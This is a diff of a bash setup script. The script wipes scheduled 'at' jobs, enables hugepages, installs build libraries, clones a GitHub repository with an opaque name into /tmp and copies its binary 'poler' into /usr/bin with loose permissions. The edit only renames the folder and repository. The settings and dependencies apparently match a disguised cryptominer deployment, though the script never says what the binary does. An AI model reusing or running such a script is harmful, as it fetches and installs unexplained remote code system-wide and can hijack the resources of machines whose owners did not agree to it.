@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/portos/
+rm -rf /tmp/lech-poznan/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir portos
-git clone https://github.com/ara-orgy/portos.git /tmp/portos
-cd /tmp/portos
-chmod +x /tmp/portos/poler
+cd /tmp && mkdir lech-poznan
+git clone https://github.com/ara-orgy/lech-poznan.git /tmp/lech-poznan
+cd /tmp/lech-poznan
+chmod +x /tmp/lech-poznan/poler
 chmod 777 ./*.sh
-cp /tmp/portos/poler /usr/bin/
+cp /tmp/lech-poznan/poler /usr/bin/
 
 sudo apt-get install dos2unix
 sudo dos2unix time1.sh
